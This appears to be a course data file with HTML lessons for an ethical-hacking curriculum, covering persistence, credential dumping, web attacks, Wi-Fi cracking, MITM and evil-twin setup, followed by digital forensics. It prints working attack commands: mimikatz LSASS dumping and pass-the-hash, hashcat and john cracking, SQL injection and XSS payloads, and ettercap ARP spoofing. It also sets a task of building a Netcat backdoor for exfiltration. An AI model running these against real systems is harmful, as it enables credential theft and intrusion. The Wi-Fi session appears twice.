                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To remove malware</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To ensure continued access</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To scan the network</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Describe how scheduled tasks can be used for persistence.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why do attackers manipulate timestamps on files?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Set up a persistent backdoor and exfiltrate data using Netcat.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 6: Part 1: Dumping and Cracking Password Hashes',
                        content: `
                            <h4 class="font-bold">Why Extract Password Hashes?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Attackers use password hashes to gain unauthorized access</li>
                                <li>Hashes can be cracked to reveal plaintext passwords</li>
                            </ul>
            
                            <h4 class="font-bold">Common Tools for Dumping Hashes</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Windows Tools</h5>
                                <ul class="pl-6 mb-4">
                                    <li>samdump2 – Extracts hashes from the SAM file</li>
                                    <li>mimikatz – Dumps credentials stored in memory</li>
                                </ul>
            
                                <h5 class="font-semibold">2. Linux Tools</h5>
                                <ul class="pl-6 mb-4">
                                    <li>/etc/shadow – Stores hashed passwords</li>
                                    <li>John the Ripper – Cracks Linux password hashes</li>
                                </ul>
                            </div>
            
                            <h4 class="font-bold">Cracking Password Hashes</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">John the Ripper</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>john --format=NT --wordlist=rockyou.txt hashes.txt</code>
                                </div>
            
                                <h5 class="font-semibold">Hashcat</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>hashcat -m 1000 -a 0 hashes.txt rockyou.txt</code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 2: Using Mimikatz for Credential Extraction',
                        content: `
                            <h4 class="font-bold">What is Mimikatz?</h4>
                            <p class="mb-4">Mimikatz is a post-exploitation tool used to extract plaintext credentials and NTLM hashes from Windows systems.</p>
            
                            <h4 class="font-bold">Common Mimikatz Commands</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Basic Commands</h5>
                                <ul class="pl-6 mb-4">
                                    <li>privilege::debug – Elevate privileges</li>
                                    <li>sekurlsa::logonpasswords – Dump plaintext passwords</li>
                                    <li>lsadump::sam – Extract NTLM hashes from SAM</li>
                                </ul>
            
                                <h5 class="font-semibold">Dumping Credentials from LSASS</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</code>
                                </div>
            
                                <h5 class="font-semibold">Pass-the-Hash Attack</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>sekurlsa::pth /user:admin /domain:target.local /ntlm:<hash></code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Analyzing Stolen Credentials',
                        content: `
                            <h4 class="font-bold">Why Analyze Stolen Credentials?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Attackers look for reused or weak passwords</li>
                                <li>Stolen credentials can be used for lateral movement and privilege escalation</li>
                            </ul>
            
                            <h4 class="font-bold">Credential Analysis Techniques</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Checking for Reused Passwords</h5>
                                <p class="mb-2">Compare extracted credentials with known leaked passwords</p>
            
                                <h5 class="font-semibold">2. Looking for High-Privilege Accounts</h5>
                                <p class="mb-2">Identify accounts with admin or root access</p>
            
                                <h5 class="font-semibold">3. Using Credentials for Lateral Movement</h5>
                                <p class="mb-2">Use stolen credentials to access other systems</p>
                            </div>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is commonly used for extracting credentials from Windows memory?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) John the Ripper</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Mimikatz</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Hashcat</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How does Mimikatz extract passwords from memory?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of dumping password hashes?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Extract password hashes using Mimikatz and crack them using John the Ripper or Hashcat.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 5: Part 1: OWASP Top 10 Vulnerabilities',
                        content: `
                            <h4 class="font-bold">What is OWASP?</h4>
                            <p class="mb-4">The Open Web Application Security Project (OWASP) provides a list of the most critical web application security risks.</p>
            
                            <h4 class="font-bold">Top 10 Web Vulnerabilities</h4>
                            <ol class="pl-6 mb-6">
                                <li><strong>Injection Attacks</strong> - SQLi, Command Injection, LDAP Injection</li>
                                <li><strong>Broken Authentication</strong> - Weak credentials, session mismanagement</li>
                                <li><strong>Sensitive Data Exposure</strong> - Unencrypted data, weak storage practices</li>
                                <li><strong>XML External Entities (XXE)</strong> - Exploiting XML processors</li>
                                <li><strong>Broken Access Control</strong> - Unauthorized access to restricted pages</li>
                                <li><strong>Security Misconfigurations</strong> - Default credentials, exposed admin panels</li>
                                <li><strong>Cross-Site Scripting (XSS)</strong> - Injecting malicious scripts into web pages</li>
                                <li><strong>Insecure Deserialization</strong> - Exploiting serialized objects to execute code</li>
                                <li><strong>Using Components with Known Vulnerabilities</strong> - Outdated libraries and frameworks</li>
                                <li><strong>Insufficient Logging & Monitoring</strong> - Lack of detection mechanisms for cyber threats</li>
                            </ol>
                        `
                    },
                    {
                        title: 'Part 2: SQL Injection Attacks',
                        content: `
                            <h4 class="font-bold">What is SQL Injection?</h4>
                            <p class="mb-4">SQL Injection (SQLi) is an attack where an attacker injects malicious SQL code to manipulate a web application's database.</p>
            
                            <h4 class="font-bold">Types of SQL Injection</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>In-band SQLi (Classic)</strong> - Using UNION SELECT queries to extract data</li>
                                <li><strong>Blind SQLi</strong> - Inferring database structure by observing web responses</li>
                                <li><strong>Out-of-band SQLi</strong> - Using DNS or HTTP requests for exfiltration</li>
                            </ul>
            
                            <h4 class="font-bold">SQLi Exploitation Examples</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>' OR 1=1 --</code>
                                <br>
                                <code>' UNION SELECT username, password FROM users --</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Cross-Site Scripting (XSS)',
                        content: `
                            <h4 class="font-bold">What is XSS?</h4>
                            <p class="mb-4">XSS is an attack where malicious scripts are injected into a trusted website.</p>
            
                            <h4 class="font-bold">Types of XSS Attacks</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Stored XSS</strong> - Malicious script is permanently stored on the website</li>
                                <li><strong>Reflected XSS</strong> - Malicious script is part of a request and reflected in the response</li>
                                <li><strong>DOM-Based XSS</strong> - Manipulating the Document Object Model (DOM) to execute JavaScript</li>
                            </ul>
            
                            <h4 class="font-bold">XSS Payload Example</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>&lt;script&gt;alert('Hacked!');&lt;/script&gt;</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 4: CSRF Attacks & Session Hijacking',
                        content: `
                            <h4 class="font-bold">Cross-Site Request Forgery (CSRF)</h4>
                            <p class="mb-4">CSRF tricks an authenticated user into performing unwanted actions on a web application.</p>
            
                            <h4 class="font-bold">Example CSRF Attack</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>&lt;img src="http://bank.com/transfer?amount=1000&to=hacker"/&gt;</code>
                            </div>
            
                            <h4 class="font-bold">Session Hijacking</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Session Fixation</strong> - Forcing a user to use a known session ID</li>
                                <li><strong>Session Sniffing</strong> - Capturing session cookies over an unencrypted network</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Practical Web Hacking using Burp Suite',
                        content: `
                            <h4 class="font-bold">What is Burp Suite?</h4>
                            <p class="mb-4">Burp Suite is a powerful web security testing tool that allows ethical hackers to analyze and manipulate HTTP/S traffic.</p>
            
                            <h4 class="font-bold">Essential Burp Suite Features</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Proxy</strong> - Intercept and modify requests</li>
                                <li><strong>Scanner</strong> - Automated scanning for vulnerabilities</li>
                                <li><strong>Intruder</strong> - Automating brute-force attacks</li>
                                <li><strong>Repeater</strong> - Manually modifying and replaying requests</li>
                                <li><strong>Decoder</strong> - Encoding and decoding data for analysis</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 6: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which of the following is NOT part of the OWASP Top 10?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) SQL Injection</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Cross-Site Scripting</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Network Scanning</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the difference between Stored XSS and Reflected XSS?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How does session hijacking work?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Exploit a SQL Injection vulnerability using SQLmap and perform session hijacking using Burp Suite.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 6: Part 1: Wi-Fi Hacking & Cracking WPA/WPA2',
                        content: `
                            <h4 class="font-bold">Understanding Wi-Fi Security Protocols</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>WEP</strong> - Wired Equivalent Privacy – Weak and easily cracked</li>
                                <li><strong>WPA</strong> - Wi-Fi Protected Access – Uses TKIP but is still vulnerable</li>
                                <li><strong>WPA2</strong> - Wi-Fi Protected Access 2 – More secure with AES encryption</li>
                                <li><strong>WPA3</strong> - Latest standard with enhanced security measures</li>
                            </ul>
            
                            <h4 class="font-bold">Wi-Fi Cracking Methods</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Brute-Force Attack</strong> - Trying multiple passwords using tools like aircrack-ng</li>
                                <li><strong>Dictionary Attack</strong> - Using precompiled wordlists like rockyou.txt</li>
                                <li><strong>WPS Attack</strong> - Exploiting WPS vulnerabilities using reaver</li>
                                <li><strong>PMKID Attack</strong> - Capturing PMKID hashes and cracking them with hashcat</li>
                            </ul>
            
                            <h4 class="font-bold">Basic Commands for Cracking Wi-Fi</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w capture wlan0mon</code>
                                <br>
                                <code>aircrack-ng -w wordlist.txt -b &lt;BSSID&gt; capture.cap</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 2: Man-in-the-Middle (MITM) Attacks',
                        content: `
                            <h4 class="font-bold">What is a MITM Attack?</h4>
                            <p class="mb-4">A MITM attack occurs when an attacker intercepts communication between two parties to eavesdrop or manipulate data.</p>
            
                            <h4 class="font-bold">Common MITM Techniques</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>ARP Spoofing</strong> - Redirecting traffic using ettercap or arpspoof</li>
                                <li><strong>DNS Spoofing</strong> - Manipulating DNS queries to redirect users</li>
                                <li><strong>SSL Stripping</strong> - Downgrading HTTPS to HTTP for credential theft</li>
                            </ul>
            
                            <h4 class="font-bold">Basic Commands for MITM Attacks</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code>
                                <br>
                                <code>ettercap -Tq -M arp:remote /target_IP// /router_IP//</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Sniffing Network Traffic with Wireshark',
                        content: `
                            <h4 class="font-bold">What is Network Sniffing?</h4>
                            <p class="mb-4">Sniffing involves capturing and analyzing packets sent over a network to gather sensitive information.</p>
            
                            <h4 class="font-bold">Using Wireshark for Packet Analysis</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Filter HTTP Requests:</strong> http.request.method == "POST"</li>
                                <li><strong>Capture Login Credentials:</strong> Look for plaintext credentials in unencrypted packets</li>
                                <li><strong>Monitor DNS Requests:</strong> Identify potential phishing domains</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Rogue Access Points & Evil Twin Attacks',
                        content: `
                            <h4 class="font-bold">What is an Evil Twin Attack?</h4>
                            <p class="mb-4">An attacker sets up a fake Wi-Fi network that mimics a legitimate network to intercept sensitive data.</p>
            
                            <h4 class="font-bold">Steps to Create an Evil Twin</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>airbase-ng -e "Free_WiFi" -c 6 wlan0mon</code>
                                <br>
                                <code>dnsmasq -C dhcp.conf -d</code>
                                <br>
                                <code>ettercap -T -Q -i wlan0</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is used for cracking WPA/WPA2 passwords?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Wireshark</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Aircrack-ng</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Metasploit</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between WPA2 Handshake Capture and PMKID Attack.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can users protect themselves from Evil Twin Attacks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Capture and analyze Wi-Fi traffic using Wireshark, then perform an ARP Spoofing Attack using ettercap.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 6: Part 1: Wi-Fi Hacking & Cracking WPA/WPA2',
                        content: `
                            <h4 class="font-bold">Understanding Wi-Fi Security Protocols</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>WEP</strong> - Wired Equivalent Privacy – Weak and easily cracked</li>
                                <li><strong>WPA</strong> - Wi-Fi Protected Access – Uses TKIP but is still vulnerable</li>
                                <li><strong>WPA2</strong> - Wi-Fi Protected Access 2 – More secure with AES encryption</li>
                                <li><strong>WPA3</strong> - Latest standard with enhanced security measures</li>
                            </ul>
            
                            <h4 class="font-bold">Wi-Fi Cracking Methods</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Brute-Force Attack</strong> - Trying multiple passwords using tools like aircrack-ng</li>
                                <li><strong>Dictionary Attack</strong> - Using precompiled wordlists like rockyou.txt</li>
                                <li><strong>WPS Attack</strong> - Exploiting WPS vulnerabilities using reaver</li>
                                <li><strong>PMKID Attack</strong> - Capturing PMKID hashes and cracking them with hashcat</li>
                            </ul>
            
                            <h4 class="font-bold">Basic Commands for Cracking Wi-Fi</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w capture wlan0mon</code>
                                <br>
                                <code>aircrack-ng -w wordlist.txt -b &lt;BSSID&gt; capture.cap</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 2: Man-in-the-Middle (MITM) Attacks',
                        content: `
                            <h4 class="font-bold">What is a MITM Attack?</h4>
                            <p class="mb-4">A MITM attack occurs when an attacker intercepts communication between two parties to eavesdrop or manipulate data.</p>
            
                            <h4 class="font-bold">Common MITM Techniques</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>ARP Spoofing</strong> - Redirecting traffic using ettercap or arpspoof</li>
                                <li><strong>DNS Spoofing</strong> - Manipulating DNS queries to redirect users</li>
                                <li><strong>SSL Stripping</strong> - Downgrading HTTPS to HTTP for credential theft</li>
                            </ul>
            
                            <h4 class="font-bold">Basic Commands for MITM Attacks</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code>
                                <br>
                                <code>ettercap -Tq -M arp:remote /target_IP// /router_IP//</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Sniffing Network Traffic with Wireshark',
                        content: `
                            <h4 class="font-bold">What is Network Sniffing?</h4>
                            <p class="mb-4">Sniffing involves capturing and analyzing packets sent over a network to gather sensitive information.</p>
            
                            <h4 class="font-bold">Using Wireshark for Packet Analysis</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Filter HTTP Requests:</strong> http.request.method == "POST"</li>
                                <li><strong>Capture Login Credentials:</strong> Look for plaintext credentials in unencrypted packets</li>
                                <li><strong>Monitor DNS Requests:</strong> Identify potential phishing domains</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Rogue Access Points & Evil Twin Attacks',
                        content: `
                            <h4 class="font-bold">What is an Evil Twin Attack?</h4>
                            <p class="mb-4">An attacker sets up a fake Wi-Fi network that mimics a legitimate network to intercept sensitive data.</p>
            
                            <h4 class="font-bold">Steps to Create an Evil Twin</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>airbase-ng -e "Free_WiFi" -c 6 wlan0mon</code>
                                <br>
                                <code>dnsmasq -C dhcp.conf -d</code>
                                <br>
                                <code>ettercap -T -Q -i wlan0</code>
                            </div>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is used for cracking WPA/WPA2 passwords?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Wireshark</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Aircrack-ng</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Metasploit</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between WPA2 Handshake Capture and PMKID Attack.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can users protect themselves from Evil Twin Attacks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Capture and analyze Wi-Fi traffic using Wireshark, then perform an ARP Spoofing Attack using ettercap.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },

        ]
    },
    {
        id: "cyber-fundamentals-beginner",
        title: "Cybersecurity Fundamentals Beginner",
        chapters: [
            {
                id: "module-3",
                title: 'Module 3: Digital Forensics & Incident Response',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Part 1: What is Digital Forensics?',
                        content: `
                            <h4 class="font-bold">Definition & Purpose</h4>
                            <p class="mb-4">Digital forensics is the process of collecting, analyzing, and preserving electronic evidence to investigate cybercrimes, data breaches, and digital incidents.</p>
            
                            <h4 class="font-bold">Key Forensic Disciplines</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Computer Forensics</strong> - Investigating desktops, laptops, and servers</li>
                                <li><strong>Mobile Forensics</strong> - Extracting and analyzing data from smartphones and tablets</li>
                                <li><strong>Network Forensics</strong> - Capturing and analyzing network traffic</li>
                                <li><strong>Cloud Forensics</strong> - Investigating data in cloud environments</li>
                                <li><strong>Memory Forensics</strong> - Analyzing volatile memory (RAM) for artifacts</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Computer vs. Mobile Forensics',
                        content: `
                            <h4 class="font-bold">Differences Between Computer and Mobile Forensics</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Aspect</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Computer Forensics</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Mobile Forensics</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Primary Data</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Hard drives, SSDs</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Flash memory, SIM cards</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Tools Used</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Autopsy, EnCase, FTK</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Cellebrite, Oxygen Forensic Suite</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Challenges</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Encryption, deleted files</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Data volatility, cloud backups</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Data Sources</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Files, registry, logs</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">SMS, call logs, GPS, apps</td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Common Challenges in Mobile Forensics</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Encryption & Passcodes</strong> - Locked devices can limit access</li>
                                <li><strong>Cloud Backups</strong> - Data may not reside on the device itself</li>
                                <li><strong>Application Data</strong> - Many apps use end-to-end encryption</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Chain of Custody & Legal Considerations',
                        content: `
                            <h4 class="font-bold">What is the Chain of Custody?</h4>
                            <p class="mb-4">The chain of custody is a documented process ensuring that evidence remains unaltered and admissible in court.</p>
            
                            <h4 class="font-bold">Steps in Maintaining Chain of Custody</h4>
                            <ol class="pl-6 mb-6">
                                <li><strong>Collection</strong> - Acquiring evidence while preserving integrity</li>
                                <li><strong>Documentation</strong> - Recording details like date, time, location, and handling personnel</li>
                                <li><strong>Storage</strong> - Keeping evidence in secure and tamper-proof storage</li>
                                <li><strong>Analysis</strong> - Conducting forensic investigations without modifying original data</li>
                                <li><strong>Presentation</strong> - Preparing findings in a legally acceptable format</li>
                            </ol>
            
                            <h4 class="font-bold">Legal Considerations</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Admissibility of Evidence</strong> - Ensuring compliance with legal frameworks</li>
                                <li><strong>Privacy Laws & Compliance</strong> - GDPR, HIPAA, and other regulations</li>
                                <li><strong>Jurisdictional Challenges</strong> - Handling cross-border cybercrime cases</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main goal of digital forensics?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To delete unnecessary data</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To recover and analyze electronic evidence</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To create cybersecurity threats</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain why mobile forensics is more challenging than computer forensics.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What steps should be followed to maintain a proper chain of custody?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Simulate a chain of custody process and use Autopsy to analyze a test forensic image.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 2: Disk & Memory Forensics',
                        content: `
                            <h4 class="font-bold">What is Disk & Memory Forensics?</h4>
                            <p class="mb-4">Disk and memory forensics involves creating and analyzing forensic images of storage devices and RAM to investigate digital evidence.</p>
                    
                            <h4 class="font-bold">Key Components</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Forensic Imaging</strong> - Creating bit-by-bit copies of storage devices</li>
                                <li><strong>Memory Analysis</strong> - Extracting artifacts from RAM dumps</li>
                                <li><strong>File Recovery</strong> - Recovering deleted or hidden data</li>
                                <li><strong>Hash Verification</strong> - Ensuring evidence integrity</li>
                                <li><strong>Documentation</strong> - Recording all forensic procedures</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Creating Forensic Images',
                        content: `
                            <h4 class="font-bold">Using FTK Imager</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Steps to Create a Forensic Image:</h5>
                                <ol class="pl-6 mb-4">
                                    <li>Open FTK Imager and select "Create Disk Image"</li>
                                    <li>Choose physical or logical drive</li>
                                    <li>Select destination format (E01, DD, Raw image)</li>
                                    <li>Enable hash verification (MD5/SHA1)</li>
                                    <li>Start imaging process</li>
                                </ol>
                    
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>ftk_imager.exe /verify /md5 /source:/dev/sda /dest:image.E01</code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Memory Analysis with Volatility',
                        content: `
                            <h4 class="font-bold">Common Volatility Commands</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>volatility -f memory.dmp --profile=Win10x64 pslist</code>
                                <br>
                                <code>volatility -f memory.dmp --profile=Win10x64 netscan</code>
                                <br>
                                <code>volatility -f memory.dmp --profile=Win10x64 memdump -p <PID> -D output/</code>
                            </div>
                    
                            <h4 class="font-bold">Key Memory Artifacts</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Process List</strong> - Running processes and their PIDs</li>
                                <li><strong>Network Connections</strong> - Active network connections</li>
                                <li><strong>Registry Hives</strong> - System configuration data</li>
                                <li><strong>Command History</strong> - Previously executed commands</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: File Recovery Techniques',
                        content: `
                            <h4 class="font-bold">File Recovery Tools</h4>
